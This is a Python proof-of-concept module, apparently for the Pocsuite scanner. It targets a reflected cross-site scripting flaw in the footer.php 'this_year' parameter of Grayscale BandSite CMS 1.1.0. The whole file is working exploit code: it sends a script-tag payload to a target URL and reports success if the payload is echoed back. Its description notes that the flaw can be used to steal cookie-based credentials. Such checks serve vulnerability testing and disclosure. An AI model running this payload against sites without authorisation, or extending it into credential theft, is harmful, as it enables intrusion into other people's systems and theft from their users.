#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from urlparse import urljoin

class TestPOC(POCBase):
    vulID = 'SSV-82196'  # vul ID
    version = '1'
    author = 'fenghh'
    vulDate = '2006-9-21'
    createDate = '2015-10-16'
    updateDate = '2015-10-16'
    references = ['http://www.securityfocus.com/bid/20137']
    name = 'Grayscale BandSite CMS 1.1 footer.php this_year Parameter XSS'
    appPowerLink = 'http://sourceforge.net/projects/bandsitecms/'
    appName = 'Grayscale BandSite CMS'
    appVersion = '1.1.0'
    vulType = 'XSS'
    desc = '''  
        Grayscale BandSite CMS is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize
        user-supplied input data.These issues may allow an attacker to access sensitive information, execute arbitrary 
        server-side script code in the context of the affected webserver, or execute arbitrary script code in the browser of
        an unsuspecting user in the context of the affected site. This could help the attacker steal cookie-based 
        authentication credentials; other attacks are possible.Version 1.1.0 is vulnerable; other versions may also be affected.
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        payload = "/includes/footer.php?this_year=<script>alert(/Dirorder/)</script>"
        res = req.get(urljoin(self.url, payload), timeout=5)
        return self.parse_verify(res, payload, 'xss')

    def parse_verify(self, res, payload, type):
        output = Output(self)
        result = {}
        if  type == 'xss' and '>alert(/Dirorder/)<' in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = urljoin(self.url, payload)
            output.success(result)           
        else:
            output.fail('Internet Nothing returned')
        return output

    def _attack(self): 
        return self._verify()

register(TestPOC)